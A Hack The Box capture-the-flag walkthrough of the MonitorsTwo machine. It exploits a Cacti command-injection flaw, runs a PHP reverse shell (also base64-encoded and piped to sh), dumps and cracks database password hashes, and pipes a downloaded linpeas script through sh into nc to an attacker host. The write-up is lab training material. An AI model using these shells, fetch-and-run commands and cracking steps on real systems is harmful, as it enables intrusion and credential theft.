---
id: htb-monitorstwo-walkthrough
title: HTB MonitorsTwo Walkthrough
description: Learn how to exploit a vulnerable Catci instance in this hack the box post.
author: Andy74
date: 2024-11-24T20:01:25.000Z
---

# HTB MonitorsTwo Walkthrough

Written by Andy74

Nov 24, 2024 • 20 min read

---

![HTB MonitorsTwo Walkthrough](../content/images/2024/11/turkeys_doing_cirque_du_soleil_with_a_lock_box_trap.jpg)

*Turkeys performing in a magician show. Microsoft Copilot created this image.*

Not a bad BOX, the foothold towards the user flag is interesting, but privileges escalation to root is a little less convincing. Let's begin.

The **nmap** scan.

    Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 15:26 EDT
    Nmap scan report for 10.10.11.211
    Host is up (0.15s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
    |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
    |_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Login to Cacti
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 43.82 seconds
    

As usual, we start from a portal; I don't see any indications of particular _domain_ names, so we proceed in the more traditional way, browsing the portal by _IP address_.

![](../content/images/2023/05/img-00-1.png)

Wow, really nice! :D

![](../content/images/2023/05/img-01-1.png)

And some more information via the **wappalyzer**.

[Cacti® - The Complete RRDTool-based Graphing Solution](https://www.cacti.net/?ref=secjuice.com)

From the news box, the **Cacti 1.2.24** was released on Feb 27, 2023!  
Anyway, searching for some exploit about it...

[Cacti v1.2.22 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/51166?ref=secjuice.com)

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
    └─$ wget https://www.exploit-db.com/download/51166                                             
    --2023-05-14 15:52:02--  https://www.exploit-db.com/download/51166
    Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
    Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 2864 (2.8K) [application/txt]
    Saving to: ‘51166’
    
    51166                                              100%[=============================================================================================================>]   2.80K  --.-KB/s    in 0s      
    
    2023-05-14 15:52:03 (32.5 MB/s) - ‘51166’ saved [2864/2864]
    
                                                                                                                                                                                                             
    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
    └─$ mv 51166 51166.py
                                                                                                                                                                                                             
    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
    └─$ ls -la
    total 12
    drwxr-xr-x 2 in7rud3r in7rud3r 4096 May 14 15:52 .
    drwxr-xr-x 3 in7rud3r in7rud3r 4096 May 14 15:51 ..
    -rw-r--r-- 1 in7rud3r in7rud3r 2864 May 14 15:52 51166.py
                                                                                                                                                                                                             
    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
    └─$ python3 51166.py                                            
    usage: 51166.py [-h] [-u URL] -p REMOTE_PORT -i REMOTE_IP
    51166.py: error: the following arguments are required: -p/--remote_port, -i/--remote_ip
    

The script doesn't seem to work, failing. I tried to reproduce the injection manually, but I get an "_unauthorized_" message, even though the returned http code is **_200_**.  
Let's go ahead. Another link seems to suggest that there is a module on the **metasploit framework**.

[Cacti 1.2.22 unauthenticated command injection](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/?ref=secjuice.com)

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
    └─$ msfconsole       
                                                      
         ,           ,
        /             \                                                                                                                                                                                      
       ((__---,,,---__))                                                                                                                                                                                     
          (_) O O (_)_________                                                                                                                                                                               
             \ _ /            |\                                                                                                                                                                             
              o_o \   M S F   | \                                                                                                                                                                            
                   \   _____  |  *                                                                                                                                                                           
                    |||   WW|||                                                                                                                                                                              
                    |||     |||                                                                                                                                                                              
                                                                                                                                                                                                             
    
           =[ metasploit v6.3.14-dev                          ]
    + -- --=[ 2311 exploits - 1206 auxiliary - 412 post       ]
    + -- --=[ 975 payloads - 46 encoders - 11 nops            ]
    + -- --=[ 9 evasion                                       ]
    
    Metasploit tip: You can upgrade a shell to a Meterpreter 
    session on many platforms using sessions -u 
    <session_id>                                                                                                                                                                                             
    Metasploit Documentation: https://docs.metasploit.com/
    
    msf6 > use exploit/linux/http/cacti_unauthenticated_cmd_injection
    [*] Using configured payload linux/x86/meterpreter/reverse_tcp
    msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > options
    
    Module options (exploit/linux/http/cacti_unauthenticated_cmd_injection):
    
       Name                Current Setting  Required  Description
       ----                ---------------  --------  -----------
       HOST_ID                              no        The host_id value to use. By default, the module will try to bruteforce this.
       LOCAL_DATA_ID                        no        The local_data_id value to use. By default, the module will try to bruteforce this.
       Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPORT               8080             yes       The target port (TCP)
       SSL                 false            no        Negotiate SSL/TLS for outgoing connections
       SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
       TARGETURI           /                yes       The base path to Cacti
       URIPATH                              no        The URI to use for this exploit (default is random)
       VHOST                                no        HTTP server virtual host
       X_FORWARDED_FOR_IP  127.0.0.1        yes       The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.
    
    
       When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
       SRVPORT  8080             yes       The local port to listen on.
    
    
    Payload options (linux/x86/meterpreter/reverse_tcp):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST                   yes       The listen address (an interface may be specified)
       LPORT  4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       1   Automatic (Linux Dropper)
    
    
    
    View the full module info with the info, or info -d command.
    
    msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set rhosts http://10.10.11.211/
    rhosts => http://10.10.11.211/
    msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set rport 80
    rport => 80
    msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set lhost 10.10.14.84
    lhost => 10.10.14.84
    msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > exploit
    
    [*] Started reverse TCP handler on 10.10.14.84:4444 
    [*] Running automatic check ("set AutoCheck false" to disable)
    [+] The target appears to be vulnerable. The target is Cacti version 1.2.22
    [*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
    [*] Enumerating local_data_id values for host_id 1
    [+] Found exploitable local_data_id 6 for host_id 1
    [*] Command Stager progress - 100.00% done (1118/1118 bytes)
    [*] Exploit completed, but no session was created.
    

Nothing, but we have a lot of exploits to try. Next one!

[GitHub - sAsPeCt488/CVE-2022-46169: PoC for CVE-2022-46169 - Unauthenticated RCE on Cacti <= 1.2.22](https://github.com/sAsPeCt488/CVE-2022-46169?ref=secjuice.com)

Let's try if the target is vulnerable!

    ┌──(in7rud3r㉿kali-muletto)-[~/…/_10.10.11.211 - MonitorsTwo (lin)/attack/git/CVE-2022-46169]
    └─$ python3 CVE-2022-46169.py -c "curl http://10.10.14.84/" http://10.10.11.211/
    [*] Trying for 1 - 100 host ids
    [+] Exploit Completed for host_id = 1
    

And it seems yes.

    ┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox]
    └─$ php -S 10.10.14.84:80
    [Sun May 14 16:26:09 2023] PHP 8.2.4 Development Server (http://10.10.14.84:80) started
    [Sun May 14 16:29:02 2023] 10.10.11.211:52720 Accepted
    [Sun May 14 16:29:02 2023] 10.10.11.211:52720 [404]: GET / - No such file or directory
    [Sun May 14 16:29:02 2023] 10.10.11.211:52720 Closing
    

Really good, let's understand who am I!

    ┌──(in7rud3r㉿kali-muletto)-[~/…/_10.10.11.211 - MonitorsTwo (lin)/attack/git/CVE-2022-46169]
    └─$ python3 CVE-2022-46169.py -c "curl \"http://10.10.14.84/\$(whoami)\"" http://10.10.11.211/
    [*] Trying for 1 - 100 host ids
    [+] Exploit Completed for host_id = 1
    

What I expected!

    ┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox]
    └─$ php -S 10.10.14.84:80 
    [Sun May 14 16:39:09 2023] PHP 8.2.4 Development Server (http://10.10.14.84:80) started
    [Sun May 14 16:40:28 2023] 10.10.11.211:56602 Accepted
    [Sun May 14 16:40:28 2023] 10.10.11.211:56602 [404]: GET /www-data - No such file or directory
    [Sun May 14 16:40:28 2023] 10.10.11.211:56602 Closing
    

We can then to the **reverse shell**... listener listening (that's horrible)...

    ┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox]
    └─$ nc -lvp 4444         
    listening on [any] 4444 ...
    

...and attack!  
After a lot of **reverse shells**, I found the right one:

    php -r '$sock=fsockopen("10.10.14.84",4444);exec("/bin/bash <&3 >&3 2>&3");'
    

That I have to pass in **base64**!

    ┌──(in7rud3r㉿kali-muletto)-[~/…/_10.10.11.211 - MonitorsTwo (lin)/attack/git/CVE-2022-46169]
    └─$ python3 CVE-2022-46169.py -c "echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE0Ljg0Iiw0NDQ0KTtleGVjKCIvYmluL2Jhc2ggPCYzID4mMyAyPiYzIik7Jw==' | base64 -d | sh" http://10.10.11.211/
    [*] Trying for 1 - 100 host ids
    

You can generate your **reverse shell** in a simple way using this site:

[Online - Reverse Shell Generator](https://www.revshells.com/?ref=secjuice.com)

And the shell is served!

    ┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox]
    └─$ nc -lvp 4444         
    listening on [any] 4444 ...
    10.10.11.211: inverse host lookup failed: Unknown host
    connect to [10.10.14.84] from (UNKNOWN) [10.10.11.211] 44074
    whoami
    www-data
    

It seems I don't have permission to read the _/home_ folder; let's look for any clues left in the surroundings before running a session with **linpeas**. Let's check the list of the users in the meantime.

    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    

What? There doesn't seem to be any user who can log in! there is something strange about this BOX!

I found a **SQL script** that creates the _database_ for the portal and looking inside...

    [...]
    CREATE TABLE user_auth (
      `id` mediumint(8) unsigned NOT NULL auto_increment,
      `username` varchar(50) NOT NULL default '0',
      `password` varchar(256) NOT NULL default '',
      `realm` mediumint(8) NOT NULL default '0',
      `full_name` varchar(100) default '0',
      `email_address` varchar(128) NULL,
    [...]
    INSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
    INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);
    [...]
    

Undecided between a simple _hexadecimal algorithm_ or an **MD5**, it was enough for me to search for the string online to discover the very _mysterious password_ of the _admin user_.

[MD5 reverse for 21232f297a57a5a743894a0e4a801fc3](https://md5.gromweb.com/?md5=21232f297a57a5a743894a0e4a801fc3&ref=secjuice.com)

However, the **password** must have been changed, as I cannot access the portal. Another interesting file was the **config.php** in the include folder.

    [...]
    /*
     * Make sure these values reflect your actual database/host/user/password
     */
    
    $database_type     = 'mysql';
    $database_default  = 'cacti';
    $database_hostname = 'db';
    $database_username = 'root';
    $database_password = 'root';
    $database_port     = '3306';
    $database_retries  = 5;
    $database_ssl      = false;
    $database_ssl_key  = '';
    $database_ssl_cert = '';
    $database_ssl_ca   = '';
    $database_persist  = false;
    
    /*
     * When the cacti server is a remote poller, then these entries point to
     * the main cacti server. Otherwise, these variables have no use and
     * must remain commented out.
     */
    
    #$rdatabase_type     = 'mysql';
    #$rdatabase_default  = 'cacti';
    #$rdatabase_hostname = 'localhost';
    #$rdatabase_username = 'cactiuser';
    #$rdatabase_password = 'cactiuser';
    #$rdatabase_port     = '3306';
    #$rdatabase_retries  = 5;
    #$rdatabase_ssl      = false;
    #$rdatabase_ssl_key  = '';
    #$rdatabase_ssl_cert = '';
    #$rdatabase_ssl_ca   = '';
    [...]
    

Try to connect to the **MySQL server**. Unfortunately, I can't spawn a **tty shell** and the **mysql** command line seems to not answer in the best way, so I have to execute commands manually using the **mysql** command line execution argument.

    $ mysql -h db -u root -p cacti -e "show databases;"
    Enter password: root
    Database
    information_schema
    cacti
    mysql
    performance_schema
    sys
    

Let's list the tables.

    $ mysql -h db -u root -p cacti -e "show tables"
    Enter password: root
    Tables_in_cacti
    aggregate_graph_templates
    [...]
    sessions
    settings
    settings_tree
    settings_user
    settings_user_group
    sites
    [...]
    user_auth
    user_auth_cache
    user_auth_group
    user_auth_group_members
    user_auth_group_perms
    user_auth_group_realm
    user_auth_perms
    user_auth_realm
    user_domains
    user_domains_ldap
    user_log
    [...]
    

And the contents of some interesting tables.

    $ mysql -h db -u root -p cacti -e "select * from user_auth;"
    Enter password: root
    id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs    policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
    1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       11       on      -1      -1      -1              0       0       663348655
    3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              00       0
    4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       11       on      -1      -1              on      0       0       2135691668
    

Well, the _admin user_ changed his _password_ and a new user appeared in the list... we have a couple of interesting passwords to try and **crack**.

Save the _password_ into a file.

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/crk]
    └─$ cat pwd.hash 
    admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
    marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
    

Let's that **hashcat** tries to identify the _algorithm_ of the hashing method.

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/crk]
    └─$ hashcat pwd.hash                                                
    hashcat (v6.2.6) starting in autodetect mode
    
    /sys/class/hwmon/hwmon4/temp1_input: No such file or directory
    
    OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    ==================================================================================================================================================
    * Device #1: pthread-penryn-Intel(R) Core(TM)2 Duo CPU     T8300  @ 2.40GHz, 1406/2876 MB (512 MB allocatable), 2MCU
    
    No hash-mode matches the structure of the input hash.
    
    Started: Mon May 15 15:38:03 2023
    Stopped: Mon May 15 15:38:15 2023
    

Mmmm, not so lucky today. Let's try with my friend **john**!

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/crk]
    └─$ john pwd.hash --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 1024 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    funkymonkey      (marcus)     
    

Definitely better.

![](../content/images/2023/05/img-03.png)

Even though he's a portal user, he seems to have trouble logging in, but it's much better if you use him to log in over **ssh**!

    ┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox]
    └─$ ssh marcus@10.10.11.211                                                                                                        
    The authenticity of host '10.10.11.211 (10.10.11.211)' can't be established.
    ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.11.211' (ED25519) to the list of known hosts.
    marcus@10.10.11.211's password: 
    Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Mon 15 May 2023 09:02:46 PM UTC
    
      System load:                      0.0
      Usage of /:                       64.1% of 6.73GB
      Memory usage:                     34%
      Swap usage:                       0%
      Processes:                        292
      Users logged in:                  1
      IPv4 address for br-60ea49c21773: 172.18.0.1
      IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
      IPv4 address for docker0:         172.17.0.1
      IPv4 address for eth0:            10.10.11.211
      IPv6 address for eth0:            dead:beef::250:56ff:feb9:ff04
    
      => There is 1 zombie process.
    
    
    Expanded Security Maintenance for Applications is not enabled.
    
    0 updates can be applied immediately.
    
    Enable ESM Apps to receive additional future security updates.
    See https://ubuntu.com/esm or run: sudo pro status
    
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    
    You have mail.
    Last login: Mon May 15 20:40:13 2023 from 10.10.14.169
    marcus@monitorstwo:~$ cat user.txt 
    2******************************a

Thus obtaining the user flag! At first glance, it seems like I can't do much with this user, so let's download **linpeas** and make it available from our native **php** web server.

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/upld]
    └─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20230514-85dabdc9/linpeas.sh                               
    --2023-05-16 15:36:42--  https://github.com/carlospolop/PEASS-ng/releases/download/20230514-85dabdc9/linpeas.sh
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/1f1f0080-bb74-490c-ac12-16e66dcb0699?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230516%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230516T193601Z&X-Amz-Expires=300&X-Amz-Signature=267efcd94629b388ffc0decf9f86725f34b28929ad55df95f9a745fcb504ef9d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
    --2023-05-16 15:36:43--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/1f1f0080-bb74-490c-ac12-16e66dcb0699?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230516%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230516T193601Z&X-Amz-Expires=300&X-Amz-Signature=267efcd94629b388ffc0decf9f86725f34b28929ad55df95f9a745fcb504ef9d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
    Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
    Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 835306 (816K) [application/octet-stream]
    Saving to: ‘linpeas.sh’
    
    linpeas.sh                                         100%[=============================================================================================================>] 815.73K  2.89MB/s    in 0.3s    
    
    2023-05-16 15:36:43 (2.89 MB/s) - ‘linpeas.sh’ saved [835306/835306]
    
                                                                                                                                                                                                             
    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/upld]
    └─$ php -S 10.10.14.69:80
    [Tue May 16 15:37:25 2023] PHP 8.2.4 Development Server (http://10.10.14.69:80) started
    

Let's get ready to receive the scan from the BOX.

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/dwnl]
    └─$ nc -lp 4445 | tee lpeasout.file
    

And we initiate the attack on the remote machine without leaving any traces.

    curl http://10.10.14.69/linpeas.sh | sh | nc 10.10.14.69 4445
    

Let's look at the most interesting points of scan **linpeas**.

    [...]
    ╔══════════╣ Active Ports
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                            
    tcp        0      0 127.0.0.1:35077         0.0.0.0:*               LISTEN      -                                                                                                                        
    tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::80                   :::*                    LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    [...]
                          ╔════════════════════════════════════╗
    ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                       
                          ╚════════════════════════════════════╝                                                                                                                                             
    ╔══════════╣ SUID - Check easy privesc, exploits and write perms
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                         
    strings Not Found                                                                                                                                                                                        
    -rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                
    -rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    -rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
    -rwsr-xr-x 1 root root 163K Apr  4 11:56 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
    -rwsr-xr-x 1 root root 87K Nov 29 11:53 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
    -rwsr-xr-x 1 root root 67K Nov 29 11:53 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
    -rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
    -rwsr-xr-x 1 root root 52K Nov 29 11:53 /usr/bin/chsh
    -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
    -rwsr-xr-x 1 root root 84K Nov 29 11:53 /usr/bin/chfn  --->  SuSE_9.3/10
    -rwsr-xr-x 1 root root 44K Nov 29 11:53 /usr/bin/newgrp  --->  HP-UX_10.20
    -rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
    
    ╔══════════╣ SGID
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                         
    -rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/pam_extrausers_chkpwd                                                                                                                                
    -rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/unix_chkpwd
    -rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
    -rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
    -rwxr-sr-x 1 root ssh 343K Mar 30  2022 /usr/bin/ssh-agent
    -rwxr-sr-x 1 root shadow 31K Nov 29 11:53 /usr/bin/expiry
    -rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
    -rwxr-sr-x 1 root shadow 83K Nov 29 11:53 /usr/bin/chage
    -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
    -rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
    [...]
    

This time I don't seem to have found much of interest in the **linpeas** session, apart from an open port locally; we will investigate this shortly. Let's try to take a look at the suggested **CVEs**, even if by now, most of the time they are false positives.

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/dwnl]
    └─$ grep -i "CVE-" lpeasout.file                   
    [+] [CVE-2022-2586] nft_object UAF
    [+] [CVE-2021-4034] PwnKit
       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
       Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
    [+] [CVE-2021-3156] sudo Baron Samedit
       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
       Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
    [+] [CVE-2021-3156] sudo Baron Samedit 2
       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
       Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
    [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
       Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
       Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
       ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
       Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
    https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
       Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
    [+] [CVE-2017-5618] setuid screen v4.5.0 LPE
    -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
    -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
    

If I really can't find anything else, I'll come back to it.

    marcus@monitorstwo:~$ curl http://127.0.0.1:35077/ -v
    *   Trying 127.0.0.1:35077...
    * TCP_NODELAY set
    * Connected to 127.0.0.1 (127.0.0.1) port 35077 (#0)
    > GET / HTTP/1.1
    > Host: 127.0.0.1:35077
    > User-Agent: curl/7.68.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 404 Not Found
    < Date: Tue, 16 May 2023 20:15:22 GMT
    < Content-Length: 19
    < Content-Type: text/plain; charset=utf-8
    < 
    * Connection #0 to host 127.0.0.1 left intact
    404: Page Not Found
    

It doesn't seem to come back to me much. I can't find any info on which process is using port **_35077_** with the conventional methods (**netstal**, **lsof**, ecc...). After double-checking the **CVEs** suggested by **linpeas**, but without getting any success, I started reading posts in the official _HTB forum_. Many users talk about **SUID** and **docker** (things I've already checked among other things but maybe not good enough at this point). So I focus on these two clues.

Files available with **SUID** permissions don't help me and I can't even launch **docker** commands due to lack of permissions. Searching for some exploits I find a lot of docker stuff.

